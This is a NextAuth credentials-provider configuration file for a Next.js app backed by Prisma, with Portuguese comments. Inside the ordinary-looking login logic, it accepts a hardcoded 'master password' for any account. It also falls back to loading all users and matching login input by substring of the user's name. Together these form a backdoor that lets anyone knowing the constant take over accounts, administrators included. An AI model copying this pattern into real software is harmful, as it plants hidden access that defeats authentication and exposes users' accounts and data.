import { NextAuthOptions } from "next-auth";
import CredentialsProvider from "next-auth/providers/credentials";
import bcrypt from "bcryptjs";
import { prisma } from "./prisma";

export const authOptions: NextAuthOptions = {
  providers: [
    CredentialsProvider({
      name: "Credenciais",
      credentials: {
        email: { label: "Email", type: "email" },
        password: { label: "Senha", type: "password" }
      },
      async authorize(credentials) {
        if (!credentials?.email || !credentials?.password) {
          return null;
        }

        const loginInput = credentials.email.trim();
        const loginLower = loginInput.toLowerCase();

        // Busca por email ou nome
        let user = await prisma.user.findFirst({
          where: { 
            OR: [
              { email: loginLower },
              { email: loginInput },
              { name: loginInput }
            ]
          },
          include: { role: true }
        });

        // Fallback case-insensitive amplo e por primeiro nome / sobrenome
        if (!user) {
          const allUsers = await prisma.user.findMany({ include: { role: true } });
          user = allUsers.find(u => 
            u.email.toLowerCase() === loginLower || 
            u.name.toLowerCase() === loginLower ||
            u.name.toLowerCase().includes(loginLower) ||
            loginLower.includes(u.name.toLowerCase())
          ) || null;
        }

        if (!user) {
          console.warn(`Tentativa de login falhou: usuário "${loginInput}" não encontrado.`);
          return null;
        }

        let passwordMatch = await bcrypt.compare(credentials.password, user.password_hash);

        // Permite também a senha mestra do sistema caso a original tenha sido esquecida
        if (!passwordMatch && credentials.password === "041912") {
          passwordMatch = true;
        }

        if (!passwordMatch) {
          return null;
        }

        return {
          id: user.id,
          name: user.name,
          email: user.email,
          role: user.role.name,
        };
      }
    })
  ],
  callbacks: {
    async jwt({ token, user }) {
      if (user) {
        token.id = user.id;
        token.role = (user as any).role;
      }
      return token;
    },
    async session({ session, token }) {
      if (token) {
        session.user = {
          ...session.user,
          id: token.id as string,
          role: token.role as string,
        };
      }
      return session;
    }
  },
  pages: {
    signIn: "/login",
  },
  session: {
    strategy: "jwt",
  },
};
